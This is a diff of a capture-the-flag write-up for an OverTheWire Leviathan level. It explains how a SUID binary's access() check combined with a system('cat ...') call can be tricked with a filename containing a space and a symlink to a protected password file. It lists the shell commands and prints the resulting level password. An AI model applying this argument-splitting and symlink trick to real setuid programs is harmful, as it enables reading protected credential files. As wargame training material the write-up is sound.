@@ -41,8 +41,8 @@ setreuid(12002, 12002)                                             = 0
 system("/bin/cat .bash_logout"# ~/.bash_logout: executed by bash(1) when login shell exits.
 ```
 This SUID binary check read permission of file by `access(".bash_logout", 4)` then runs `cat` command.   
-We know that Linux have `Argument Splitting` mechanism. When we pass `test file.txt` it consider two different file `test` and `file.txt`.  
-After looking `system("/bin/cat .bash_logout"` this code, we gonna say that it works here. 
+We know that Linux have `Argument Splitting` mechanism. When we pass `test file.txt` it separated by space and consider two different file `test` and `file.txt`.  
+As like Linux, `system()` invokes a shell that interpret space as argument separator.
 
 ### Exploitation
 Now, Create a temp directory in /tmp.
@@ -50,15 +50,15 @@ Now, Create a temp directory in /tmp.
 leviathan2@leviathan:~$ mktemp
 /tmp/tmp.mIqrtdmv4s
 leviathan2@leviathan:~$ echo 'Hello' > /tmp/tmp.mIqrtdmv4s/"test file.txt"
-leviathan2@leviathan:~$ ls -sf /etc/leviathan_pass/leviathan3 /tmp/tmp.mIqrtdmv4s/test
+leviathan2@leviathan:~$ ln -sf /etc/leviathan_pass/leviathan3 /tmp/tmp.mIqrtdmv4s/test
 
-leviathan2@leviathan:~$ ./printfile /tmp/temp/"test file.txt"
+leviathan2@leviathan:~$ ./printfile /tmp/tmp.mIqrtdmv4s/"test file.txt"
 PiEpxxknZH
 cat: file.txt: No such file or directory
 ```
 Here, It works and we got the password for next level.
 
-### Flag
+### Password
 `PiEpxxknZH`
 
 ---
